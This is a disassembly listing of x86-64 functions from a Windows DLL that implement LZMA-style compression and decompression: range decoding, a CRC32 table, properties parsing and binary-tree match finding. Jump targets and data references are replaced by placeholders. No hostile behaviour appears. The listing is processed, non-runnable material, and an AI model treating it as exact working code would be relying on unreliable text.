mov edx r13d
cmovb r12d ecx
mov rcx r13
shl r12d 0x6
lea rbx [ r15 + r12 * 2 + 0x360 ]
nop [ rax + rax ] ax
mov eax r10d
shr eax 0xb
imul eax r8d
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
sub r10d eax
sub r9d eax
lea edx [ rdx + rdx + 0x1 ]
inc rcx
mov r10d eax
add edx edx
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
add rcx rcx
movzx r8d [ rcx + rbx ]
cmp r10d 0x1000000
jae r-xdata
add edx 0xffffffc0
cmp edx 0x4
jb r-xdata
cmp edx 0x40
jb r-xdata
mov r8d edx
shr r8d 0x1
dec r8d
cmp edx 0xe
jae r-xdata
sub r8d 0x4
mov eax edx
mov ecx r8d
and eax r13d
or eax 0x2
shl eax cl
mov ecx eax
mov eax edx
sub rcx rax
lea rdx [ r15 + rcx * 2 + 0x55e ]
jmp r-xdata
shr r10d 0x1
mov eax r9d
sub eax r10d
shr eax 0x1f
dec eax
and eax r10d
sub r9d eax
dec r8d
jne r-xdata
cmp r11 rdi
jae r-xdata
add r13 r13
movzx ecx [ r13 + rdx ]
cmp r10d 0x1000000
jae r-xdata
cmp r10d 0x1000000
jae r-xdata
lea rdx [ r15 + 0x644 ]
mov r8d 0x4
nop [ rax + rax ] ax
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
mov eax r10d
shr eax 0xb
imul eax ecx
cmp r9d eax
jae r-xdata
cmp r11 rdi
jae r-xdata
sub r10d eax
sub r9d eax
inc r13
mov r10d eax
jmp r-xdata
movzx eax [ r11 ]
shl r9d 0x8
shl r10d 0x8
or r9d eax
inc r11
dec r8d
jne r-xdata
sub_1800071f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi [ r9 ]
xor r14d r14d
mov r13 r9
mov rbp r8
mov r12 rdx
mov rbx rcx
mov [ r9 ] r14
call sub_1800069a0
mov r15 [ rsp + 0x70 ]
mov [ r15 ] r14d
mov ecx [ rbx + 0x2c ]
test ecx ecx
jne r-xdata
mov edi 0x400
cmp [ rbx + 0x60 ] r14d
je r-xdata
setne r14b
mov eax r14d
mov [ r15 ] 0x1
cmp [ rbx + 0x30 ] r12
jae r-xdata
test rsi rsi
je r-xdata
cmp [ rbx + 0x5c ] r14d
jne r-xdata
cmp [ rbx + 0x64 ] r14d
je r-xdata
cmp [ rbx + 0x6c ] 0x5
jb r-xdata
mov eax [ rbx + 0x6c ]
cmp eax 0x5
jae r-xdata
mov [ r15 ] 0x2
xor eax eax
jmp r-xdata
cmp [ rbx + 0x2c ] r14d
jne r-xdata
movsxd rdi [ rbx + 0x6c ]
test edi edi
jne r-xdata
mov ecx [ rbx + 0x4 ]
mov edx 0x300
add ecx [ rbx ]
shl edx cl
add edx 0x736
je r-xdata
mov [ r15 ] 0x3
xor eax eax
jmp r-xdata
cmp [ rbx + 0x70 ] r14b
jne r-xdata
inc [ r13 ]
mov ecx eax
movzx eax [ rbp ]
mov [ rcx + rbx + 0x70 ] al
inc [ rbx + 0x6c ]
inc rbp
dec rsi
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov [ r15 ] 0x4
xor eax eax
jmp r-xdata
mov r12d r14d
mov rdx rdi
cmp edi 0x14
jae r-xdata
cmp rsi 0x14
jb r-xdata
mov [ rbx + 0x58 ] 0x1
mov [ rbx + 0x54 ] 0x1
mov [ rbx + 0x50 ] 0x1
mov [ rbx + 0x4c ] 0x1
mov [ rbx + 0x48 ] r14d
mov [ rbx + 0x64 ] r14d
movzx eax di
mov rdi [ rbx + 0x10 ]
mov ecx edx
[ rdi ]
mov eax 0x1
jmp r-xdata
movzx eax [ rbx + 0x72 ]
movzx ecx [ rbx + 0x71 ]
shl ecx 0x8
or ecx eax
movzx eax [ rbx + 0x73 ]
shl ecx 0x8
or ecx eax
movzx eax [ rbx + 0x74 ]
mov [ rbx + 0x28 ] 0xffffffff
shl ecx 0x8
mov [ rbx + 0x60 ] r14d
mov [ rbx + 0x6c ] r14d
or ecx eax
mov [ rbx + 0x2c ] ecx
mov [ rbx + 0x6c ] edi
cmp edi 0x14
jae r-xdata
mov rcx rbp
mov r8 rsi
mov rdx rbp
mov rcx rbx
call sub_180006ba0
test eax eax
je r-xdata
lea r8 [ rsi + rbp - 0x14 ]
jmp r-xdata
mov rdx [ rsp + 0x58 ]
lea r8 [ rbx + 0x70 ]
mov rcx rbx
mov [ rbx + 0x20 ] r8
call sub_180006a60
test eax eax
jne r-xdata
lea rdx [ rbx + 0x70 ]
mov r8d edi
mov rcx rbx
call sub_180006ba0
test eax eax
je r-xdata
movzx eax [ rcx ]
inc edi
inc rdx
mov [ rbx + rdx + 0x6f ] al
inc r12d
inc rcx
cmp edi 0x14
jb r-xdata
mov rax [ rw-data ]
test rax rax
je r-xdata
mov r8 rbp
mov rdx r12
mov rcx rbx
mov [ rbx + 0x20 ] rbp
call sub_180006a60
test eax eax
jne r-xdata
mov eax [ rbx + 0x20 ]
mov [ rbx + 0x6c ] r14d
sub eax ebx
sub eax edi
lea ecx [ r12 + rax - 0x70 ]
mov r12 [ rsp + 0x58 ]
add [ r13 ] rcx
add rbp rcx
sub rsi rcx
jmp r-xdata
mov eax r12d
mov [ r15 ] 0x3
add [ r13 ] rax
xor eax eax
jmp r-xdata
mov eax r12d
cmp rax rsi
jae r-xdata
add [ r13 ] rsi
mov [ rbx + 0x6c ] esi
lea rcx [ rbx + 0x70 ]
mov r8 rsi
mov rdx rbp
call rax
mov rax [ rbx + 0x20 ]
sub rax rbp
add [ r13 ] rax
add rbp rax
sub rsi rax
jmp r-xdata
cmp [ rbx + 0x5c ] 0x112
je r-xdata
sub_180007490
push rbx
push rdi
sub rsp 0x28
mov rdi rcx
cmp edx 0x5
jb r-xdata
mov eax 0x4
add rsp 0x28
pop rdi
pop rbx
retn
movzx eax [ rw-data ]
movzx ebx [ rw-data ]
shl ebx 0x8
or ebx eax
movzx eax [ rw-data ]
shl ebx 0x8
or ebx eax
movzx eax [ rw-data ]
shl ebx 0x8
or ebx eax
mov eax 0x1000
cmp ebx eax
cmovb ebx eax
movzx eax [ rw-data ]
cmp al 0xe1
jae r-xdata
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] r12
movzx r12d al
mov [ rsp + 0x20 ] r13
mov eax 0x38e38e39
mov esi 0x300
imul r12d
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
movzx r13d dl
lea eax [ rdx + rdx * 8 ]
sub r12d eax
mov eax 0x66666667
imul r13d
mov ebp edx
mov rdx [ rdi + 0x10 ]
sar ebp 0x1
mov eax ebp
shr eax 0x1f
add ebp eax
lea eax [ rbp + rbp * 4 ]
sub r13d eax
lea ecx [ r12 + r13 ]
shl esi cl
add esi 0x736
test rdx rdx
je r-xdata
lea rcx [ rw-data ]
call [ rw-data ]
mov edx esi
lea rcx [ rw-data ]
add rdx rdx
mov [ rdi + 0x10 ] 0x0
call [ rw-data ]
mov [ rdi + 0x68 ] esi
mov [ rdi + 0x10 ] rax
test rax rax
jne r-xdata
cmp esi [ rdi + 0x68 ]
je r-xdata
mov [ rdi ] r12d
mov [ rdi + 0x4 ] r13d
mov [ rdi + 0x8 ] ebp
mov [ rdi + 0xc ] ebx
xor eax eax
jmp r-xdata
mov eax 0x2
mov r12 [ rsp + 0x50 ]
mov rsi [ rsp + 0x48 ]
mov rbp [ rsp + 0x40 ]
mov r13 [ rsp + 0x20 ]
add rsp 0x28
pop rdi
pop rbx
retn
sub_1800075d0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov edi [ rcx + 0x5c ]
mov rbx rcx
add edi [ rcx + 0x58 ]
add edi edx
cmp [ rcx + 0x64 ] 0x0
je r-xdata
mov rdx [ rcx + 0x40 ]
mov [ rsp + 0x30 ] rsi
xor esi esi
test rdx rdx
je r-xdata
mov [ rcx + 0x54 ] edi
mov eax 0x1
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rw-data ]
call [ rw-data ]
lea rcx [ rw-data ]
mov edx edi
mov [ rbx + 0x40 ] rsi
mov [ rbx + 0x54 ] edi
call [ rw-data ]
mov [ rbx + 0x40 ] rax
cmp [ rcx + 0x54 ] edi
je r-xdata
cmp [ rbx + 0x40 ] rsi
mov rbx [ rsp + 0x38 ]
setne sil
mov eax esi
mov rsi [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180007680
push rbx
sub rsp 0x20
cmp [ rcx + 0x50 ] 0x0
mov rbx rcx
jne r-xdata
add rsp 0x20
pop rbx
retn
cmp [ rcx + 0x88 ] 0x0
jne r-xdata
cmp [ rcx + 0x64 ] 0x0
je r-xdata
mov ecx [ rcx + 0x10 ]
mov eax [ rbx + 0x54 ]
sub ecx [ rbx + 0x8 ]
add rcx [ rbx ]
sub rax rcx
add rax [ rbx + 0x40 ]
mov [ rsp + 0x30 ] rax
je r-xdata
mov edx [ rcx + 0x10 ]
or ecx 0xffffffff
sub ecx edx
mov eax ecx
cmp rax [ rbx + 0x68 ]
jbe r-xdata
nop [ rax + rax ] ax
mov eax ecx
sub [ rbx + 0x68 ] rax
lea eax [ rdx + rcx ]
mov [ rbx + 0x10 ] eax
jne r-xdata
mov ecx [ rbx + 0x68 ]
mov rax [ rsp + 0x30 ]
test rax rax
je r-xdata
mov [ rbx + 0x50 ] 0x1
add [ rbx + 0x10 ] eax
mov eax [ rbx + 0x10 ]
sub eax [ rbx + 0x8 ]
cmp eax [ rbx + 0x5c ]
ja r-xdata
mov ecx [ rbx + 0x10 ]
mov eax [ rbx + 0x54 ]
sub ecx [ rbx + 0x8 ]
add rcx [ rbx ]
sub rax rcx
add rax [ rbx + 0x40 ]
mov [ rsp + 0x30 ] rax
jne r-xdata
mov rax [ rbx + 0x48 ]
mov rdx rcx
lea r8 [ rsp + 0x30 ]
mov rcx rax
call [ rax ]
mov [ rbx + 0x88 ] eax
test eax eax
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_180007750
xor edx edx
mov [ rcx + 0x3c ] 0x20
mov [ rcx + 0x60 ] 0x4
mov [ rcx + 0x70 ] 0x1
lea r8 [ rcx + 0x8c ]
mov [ rcx + 0x40 ] rdx
mov [ rcx + 0x28 ] rdx
nop [ rax + rax ] eax
mov ecx edx
mov eax edx
inc edx
shr eax 0x1
and ecx 0x1
add r8 0x4
dec ecx
not ecx
and ecx 0xedb88320
xor ecx eax
mov eax ecx
shr ecx 0x1
and eax 0x1
dec eax
not eax
and eax 0xedb88320
xor eax ecx
mov ecx eax
shr eax 0x1
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
xor ecx eax
mov eax ecx
shr ecx 0x1
and eax 0x1
dec eax
not eax
and eax 0xedb88320
xor eax ecx
mov ecx eax
shr eax 0x1
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
xor ecx eax
mov eax ecx
shr ecx 0x1
and eax 0x1
dec eax
not eax
and eax 0xedb88320
xor eax ecx
mov ecx eax
shr eax 0x1
and ecx 0x1
dec ecx
not ecx
and ecx 0xedb88320
xor ecx eax
mov eax ecx
shr ecx 0x1
and eax 0x1
dec eax
not eax
and eax 0xedb88320
xor eax ecx
mov [ r8 - 0x4 ] eax
cmp edx 0x100
jb r-xdata
retn
sub_180007830
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov ebp r9d
mov esi edx
mov rbx rcx
cmp edx 0xc0000000
jbe r-xdata
shr edx 0x1
cmp esi 0x80000000
jbe r-xdata
mov rdx [ rcx + 0x28 ]
lea rcx [ rw-data ]
call [ rw-data ]
xor edi edi
jmp r-xdata
lea eax [ rsi + r8 + 0x1 ]
mov [ rcx + 0x58 ] eax
mov ecx [ rsp + 0x50 ]
lea eax [ r9 + rcx ]
mov [ rbx + 0x5c ] eax
lea eax [ r8 + r9 ]
add eax ecx
mov rcx rbx
shr eax 0x1
lea edx [ rax + rdx + 0x80000 ]
call sub_1800075d0
xor edi edi
test eax eax
je r-xdata
mov edx esi
shr edx 0x2
mov [ rbx + 0x28 ] rdi
cmp [ rbx + 0x64 ] edi
jne r-xdata
mov rdx [ rbx + 0x28 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov r8d [ rbx + 0x60 ]
lea r9d [ rsi + 0x1 ]
mov [ rbx + 0x20 ] ebp
mov [ rbx + 0x7c ] edi
cmp r8d 0x2
jne r-xdata
xor eax eax
mov rdx [ rbx + 0x40 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov [ rbx + 0x40 ] rdi
lea ecx [ rsi - 0x1 ]
mov eax ecx
shr eax 0x1
or ecx eax
mov eax ecx
shr eax 0x2
or ecx eax
mov eax ecx
shr eax 0x4
or ecx eax
mov edx ecx
or edx 0x1fffe00
shr edx 0x8
or edx ecx
shr edx 0x1
cmp edx 0x1000000
jbe r-xdata
mov edx 0xffff
jmp r-xdata
mov [ rbx + 0x38 ] edx
inc edx
cmp r8d 0x2
jbe r-xdata
cmp r8d 0x3
jne r-xdata
cmp r8d 0x3
jbe r-xdata
mov [ rbx + 0x7c ] 0x400
shr edx 0x1
mov edx 0xffffff
jmp r-xdata
cmp r8d 0x4
jbe r-xdata
add [ rbx + 0x7c ] 0x10000
mov ecx [ rbx + 0x80 ]
mov r8d [ rbx + 0x7c ]
mov [ rbx + 0x78 ] esi
add ecx [ rbx + 0x84 ]
add r8d edx
mov [ rbx + 0x1c ] r9d
mov [ rbx + 0x80 ] r8d
cmp [ rbx + 0x70 ] edi
je r-xdata
add [ rbx + 0x7c ] 0x100000
mov rdx [ rbx + 0x28 ]
mov [ rbx + 0x84 ] r9d
lea esi [ r8 + r9 ]
test rdx rdx
je r-xdata
add r9d r9d
lea rcx [ rw-data ]
call [ rw-data ]
lea rdx [ rsi * 4 ]
mov ecx esi
mov rax rdx
mov [ rbx + 0x28 ] rdi
shr rax 0x2
cmp rax rcx
je r-xdata
cmp ecx esi
je r-xdata
lea rcx [ rw-data ]
call [ rw-data ]
mov rax rdi
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ rbx + 0x80 ]
lea rax [ rax + rcx * 4 ]
mov [ rbx + 0x30 ] rax
mov [ rbx + 0x28 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180007a20
push rbx
sub rsp 0x20
mov rbx rcx
xor ecx ecx
mov edx ecx
cmp [ rbx + 0x80 ] ecx
jbe r-xdata
mov rax [ rbx + 0x40 ]
mov [ rbx + 0x18 ] ecx
mov [ rbx + 0x88 ] ecx
mov [ rbx ] rax
mov eax [ rbx + 0x1c ]
mov [ rbx + 0x50 ] ecx
mov rcx rbx
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x8 ] eax
call sub_180007680
mov r11d [ rbx + 0x8 ]
mov eax [ rbx + 0x1c ]
sub eax [ rbx + 0x18 ]
mov edx [ rbx + 0x10 ]
mov r8d [ rbx + 0x5c ]
or ecx 0xffffffff
sub ecx r11d
cmp eax ecx
cmovb ecx eax
sub edx r11d
mov eax edx
cmp edx r8d
ja r-xdata
mov r8d ecx
nop [ rax + rax ] eax
sub eax r8d
test edx edx
je r-xdata
mov rax [ rbx + 0x28 ]
inc edx
add r8 0x4
mov [ r8 + rax - 0x4 ] ecx
cmp edx [ rbx + 0x80 ]
jb r-xdata
cmp eax ecx
cmovb ecx eax
mov eax [ rbx + 0x20 ]
cmp edx eax
cmova edx eax
lea eax [ r11 + rcx ]
mov [ rbx + 0xc ] eax
mov [ rbx + 0x14 ] edx
add rsp 0x20
pop rbx
retn
mov eax 0x1
jmp r-xdata
sub_180007ad0
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov [ rsp + 0x38 ] r12
xor r12d r12d
mov rbx rcx
cmp [ rcx + 0x8 ] edi
jne r-xdata
cmp [ rbx + 0x50 ] r12d
jne r-xdata
mov eax [ rcx + 0x84 ]
mov edx 0xfffffffe
sub edx [ rcx + 0x78 ]
and edx 0xfffffc00
add eax [ rcx + 0x80 ]
mov rcx [ rcx + 0x28 ]
je r-xdata
mov eax [ rbx + 0x18 ]
mov ecx [ rbx + 0x1c ]
mov r8d [ rbx + 0x8 ]
mov edx [ rbx + 0x5c ]
cmp eax ecx
cmove eax r12d
mov r12 [ rsp + 0x38 ]
sub edi r8d
sub ecx eax
mov [ rbx + 0x18 ] eax
cmp ecx edi
cmovb edi ecx
mov ecx [ rbx + 0x10 ]
sub ecx r8d
mov eax ecx
cmp ecx edx
ja r-xdata
mov r8d [ rbx + 0x10 ]
mov r10d [ rbx + 0x8 ]
mov ecx [ rbx + 0x5c ]
mov eax r8d
sub eax r10d
cmp ecx eax
jne r-xdata
sub [ rbx + 0xc ] edx
sub [ rbx + 0x8 ] edx
sub [ rbx + 0x10 ] edx
mov r8d eax
sub eax edx
test ecx ecx
je r-xdata
cmp [ rbx + 0x64 ] r12d
jne r-xdata
sub eax edx
mov eax r12d
jmp r-xdata
cmp eax edi
cmovb edi eax
mov eax [ rbx + 0x20 ]
cmp ecx eax
cmova ecx eax
lea eax [ r8 + rdi ]
mov [ rbx + 0xc ] eax
mov [ rbx + 0x14 ] ecx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov eax 0x1
jmp r-xdata
mov rcx rbx
call sub_180007680
mov edx [ rbx + 0x54 ]
mov [ rsp + 0x30 ] rsi
mov rsi [ rbx ]
sub rdx rsi
add rdx [ rbx + 0x40 ]
cmp rdx rcx
mov ecx r12d
setbe cl
test ecx ecx
je r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
mov rsi [ rsp + 0x30 ]
mov r11 [ rw-data ]
test r11 r11
je r-xdata
mov eax [ rbx + 0x58 ]
add rax [ rbx + 0x40 ]
mov [ rbx ] rax
mov r9d [ rbx + 0x58 ]
mov rcx [ rbx + 0x40 ]
mov eax r9d
sub rsi r9
sub eax r10d
mov rdx rsi
add r8d eax
call r11
sub_180007c10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
push r15
mov edi [ rsp + 0x60 ]
movsxd rbp [ rsp + 0x70 ]
mov r10 [ rsp + 0x68 ]
mov r15d r8d
mov r8 [ rsp + 0x48 ]
mov ebx ecx
mov ecx [ rsp + 0x50 ]
mov r11d r15d
mov rsi r9
sub r11d edx
mov [ r8 + rcx * 4 ] edx
mov r14 rbp
test edi edi
je r-xdata
mov rbx [ rsp + 0x28 ]
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov rax r10
pop r15
pop r14
pop r13
pop r12
retn
mov r12d [ rsp + 0x58 ]
mov eax r11d
mov r9 rsi
sub r9 rax
xor eax eax
cmp r11d ecx
cmova eax r12d
sub eax r11d
add eax ecx
mov r13d [ r8 + rax * 4 ]
movzx eax [ r14 + rsi ]
cmp [ r14 + r9 ] al
jne r-xdata
mov r11d r15d
sub r11d r13d
test edi edi
jne r-xdata
movzx eax [ rsi ]
cmp [ r9 ] al
jne r-xdata
dec edi
cmp r11d r12d
jae r-xdata
mov ecx 0x1
mov r8d ecx
cmp ebx ecx
je r-xdata
cmp ebp ecx
jae r-xdata
lea rdx [ rsi + 0x1 ]
sub r9 rsi
mov r8 [ rsp + 0x48 ]
mov ecx [ rsp + 0x50 ]
mov [ r10 ] ecx
lea eax [ r11 - 0x1 ]
add r10 0x8
mov [ r10 - 0x4 ] eax
mov ebp ecx
mov r14 r8
cmp ecx ebx
je r-xdata
inc ecx
inc r8
inc rdx
cmp ecx ebx
jne r-xdata
movzx eax [ rdx ]
cmp [ r9 + rdx ] al
jne r-xdata
sub_180007d20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] r8d
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x10
mov edi [ rsp + 0x78 ]
mov rbp [ rsp + 0x70 ]
mov r13d [ rsp + 0x88 ]
mov r10 [ rsp + 0x90 ]
mov r12 r9
mov ebx edx
mov r9d r8d
xor edx edx
xor r8d r8d
lea eax [ rdi + rdi ]
sub r9d ebx
mov r11d ecx
lea rsi [ rbp + rax * 4 ]
mov [ rsp ] r8d
mov [ rsp + 0x58 ] edx
lea r14 [ rsi + 0x4 ]
test r13d r13d
je r-xdata
mov [ rsi ] 0x0
mov [ r14 ] 0x0
mov r15d [ rsp + 0x98 ]
xor eax eax
cmp r9d edi
cmova eax ecx
sub eax r9d
add eax edi
add eax eax
lea rdi [ rbp + rax * 4 ]
mov eax r9d
mov rbp r12
sub rbp rax
cmp r8d [ rsp + 0x58 ]
cmovb edx r8d
movzx eax [ rdx + r12 ]
cmp [ rdx + rbp ] al
jne r-xdata
movzx eax [ rdx + r12 ]
cmp [ rdx + rbp ] al
jae r-xdata
inc edx
cmp edx r11d
je r-xdata
mov [ r14 ] ebx
mov ebx [ rdi ]
mov r8d edx
mov [ rsp ] edx
mov edx [ rsp + 0x58 ]
mov r14 rdi
mov [ rsi ] ebx
mov ebx [ rdi + 0x4 ]
lea rsi [ rdi + 0x4 ]
mov [ rsp + 0x58 ] edx
jmp r-xdata
cmp r15d edx
jae r-xdata
movzx eax [ rdx + r12 ]
cmp [ rdx + rbp ] al
jne r-xdata
mov edi [ rsp + 0x78 ]
mov rbp [ rsp + 0x70 ]
jmp r-xdata
mov r9d [ rsp + 0x60 ]
sub r9d ebx
test r13d r13d
je r-xdata
mov [ r10 ] edx
lea eax [ r9 - 0x1 ]
add r10 0x8
mov [ r10 - 0x4 ] eax
mov r15d edx
cmp edx r11d
je r-xdata
inc edx
movsxd rax edx
cmp edx r11d
je r-xdata
mov ecx [ rsp + 0x80 ]
dec r13d
cmp r9d ecx
jae r-xdata
mov ecx [ rdi ]
mov [ rsi ] ecx
mov ecx [ rdi + 0x4 ]
mov [ r14 ] ecx
jmp r-xdata
mov r8 rbp
lea rcx [ rax + r12 ]
sub r8 r12
mov rax r10
mov rbx [ rsp + 0x50 ]
add rsp 0x10
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r8d [ rsp ]
inc edx
inc rcx
cmp edx r11d
jne r-xdata
movzx eax [ rcx ]
cmp [ r8 + rcx ] al
jne r-xdata
sub_180007ea0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
mov esi [ rsp + 0x68 ]
mov ebx edx
mov rdx [ rsp + 0x50 ]
mov rbp r9
mov r11d ecx
mov ecx [ rsp + 0x58 ]
lea eax [ rcx + rcx ]
mov r9d r8d
xor r14d r14d
lea rdi [ rdx + rax * 4 ]
xor r15d r15d
sub r9d ebx
lea r12 [ rdi + 0x4 ]
test esi esi
je r-xdata
mov [ rdi ] 0x0
mov [ r12 ] 0x0
mov r13d [ rsp + 0x60 ]
nop [ rax + rax ] ax
xor eax eax
cmp r9d ecx
cmova eax r13d
sub eax r9d
add eax ecx
add eax eax
lea r10 [ rdx + rax * 4 ]
mov eax r9d
mov edx r15d
mov r9 rbp
sub r9 rax
cmp r14d r15d
cmovb edx r14d
movzx eax [ rdx + rbp ]
cmp [ rdx + r9 ] al
jne r-xdata
movzx eax [ rdx + rbp ]
cmp [ rdx + r9 ] al
jae r-xdata
inc edx
movsxd rax edx
cmp edx r11d
je r-xdata
mov [ r12 ] ebx
mov ebx [ r10 ]
mov r14d edx
mov r12 r10
mov [ rdi ] ebx
mov ebx [ r10 + 0x4 ]
lea rdi [ r10 + 0x4 ]
mov r15d edx
jmp r-xdata
mov eax [ r10 ]
mov [ rdi ] eax
mov eax [ r10 + 0x4 ]
mov [ r12 ] eax
jmp r-xdata
mov r8 r9
lea rcx [ rax + rbp ]
sub r8 rbp
mov ecx [ rsp + 0x58 ]
mov rdx [ rsp + 0x50 ]
jmp r-xdata
mov r9d r8d
sub r9d ebx
test esi esi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp edx r11d
je r-xdata
inc edx
inc rcx
cmp edx r11d
jne r-xdata
dec esi
cmp r9d r13d
jae r-xdata
mov r8d [ rsp + 0x40 ]
movzx eax [ rcx ]
cmp [ r8 + rcx ] al
jne r-xdata
sub_180007ff0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x50
mov r10d [ rcx + 0x14 ]
mov rsi rdx
mov rbx rcx
cmp r10d 0x2
jae r-xdata
mov rax [ rcx ]
mov rcx [ rcx + 0x28 ]
mov [ rsp + 0x48 ] 0x1
movzx r8d [ rax + 0x1 ]
movzx eax [ rax ]
mov [ rsp + 0x40 ] rsi
shl r8d 0x8
mov [ rsp + 0x60 ] rdi
or r8d eax
mov eax [ rbx + 0x8 ]
mov edx [ rcx + r8 * 4 ]
mov [ rcx + r8 * 4 ] eax
mov eax [ rbx + 0x3c ]
mov r9 [ rbx ]
mov r8d [ rbx + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov ecx r10d
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007d20
inc [ rbx + 0x8 ]
mov ecx [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
mov rdi rax
sub rdi rsi
sar rdi 0x2
cmp ecx [ rbx + 0xc ]
jne r-xdata
inc [ rcx + 0x8 ]
mov eax [ rcx + 0x8 ]
inc [ rcx + 0x18 ]
inc [ rcx ]
cmp eax [ rcx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x68 ]
mov eax edi
mov rdi [ rsp + 0x60 ]
add rsp 0x50
pop rsi
retn
mov rcx rbx
call sub_180007ad0
xor eax eax
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rsi
retn
call sub_180007ad0
sub_1800080d0
push rbx
push rsi
push rdi
sub rsp 0x50
mov edi [ rcx + 0x14 ]
mov rsi rdx
mov rbx rcx
cmp edi 0x3
jae r-xdata
mov r8 [ rbx + 0x28 ]
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x78 ] r12
mov r12 [ rcx ]
mov [ rsp + 0x80 ] r13
movzx eax [ r12 ]
movzx ecx [ r12 + 0x1 ]
movzx r9d [ r12 + 0x2 ]
mov edx [ rbx + rax * 4 + 0x8c ]
shl r9d 0x8
lea r11 [ r12 + 0x2 ]
xor edx ecx
mov ecx [ rbx + 0x8 ]
mov eax edx
xor r9d edx
mov ebp ecx
and r9d [ rbx + 0x38 ]
and eax 0x3ff
xor edx edx
sub ebp [ r8 + rax * 4 ]
mov r10d eax
lea eax [ r9 + 0x400 ]
mov r13d [ r8 + rax * 4 ]
mov [ r8 + rax * 4 ] ecx
mov rcx [ rbx + 0x28 ]
mov eax [ rcx + rax * 4 ]
lea r8d [ rdx + 0x2 ]
mov [ rcx + r10 * 4 ] eax
cmp ebp [ rbx + 0x1c ]
jae r-xdata
inc [ rcx + 0x8 ]
mov eax [ rcx + 0x8 ]
inc [ rcx + 0x18 ]
inc [ rcx ]
cmp eax [ rcx + 0xc ]
jne r-xdata
mov r9 [ rbx ]
mov [ rsp + 0x48 ] r8d
mov r8d [ rbx + 0x8 ]
mov eax edx
mov edx r13d
lea rcx [ rsi + rax * 4 ]
mov eax [ rbx + 0x3c ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov ecx edi
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007d20
inc [ rbx + 0x8 ]
mov ecx [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
mov rdi rax
sub rdi rsi
sar rdi 0x2
cmp ecx [ rbx + 0xc ]
jne r-xdata
mov eax ebp
mov rcx r12
sub rcx rax
movzx eax [ r12 ]
cmp [ rcx ] al
jne r-xdata
xor eax eax
add rsp 0x50
pop rdi
pop rsi
pop rbx
retn
call sub_180007ad0
mov eax edi
mov rcx rbx
call sub_180007ad0
movsxd rcx ebp
cmp edi r8d
je r-xdata
lea eax [ rbp - 0x1 ]
mov [ rsi ] r8d
mov edx 0x2
mov [ rsi + 0x4 ] eax
cmp r8d edi
jne r-xdata
neg rcx
mov eax [ rbx + 0x3c ]
mov r9 [ rbx ]
mov r8d [ rbx + 0x8 ]
mov [ rsp + 0x38 ] eax
mov eax [ rbx + 0x1c ]
mov edx r13d
mov [ rsp + 0x30 ] eax
mov eax [ rbx + 0x18 ]
mov ecx edi
mov [ rsp + 0x28 ] eax
mov rax [ rbx + 0x30 ]
mov [ rsp + 0x20 ] rax
call sub_180007ea0
inc [ rbx + 0x8 ]
mov ecx [ rbx + 0x8 ]
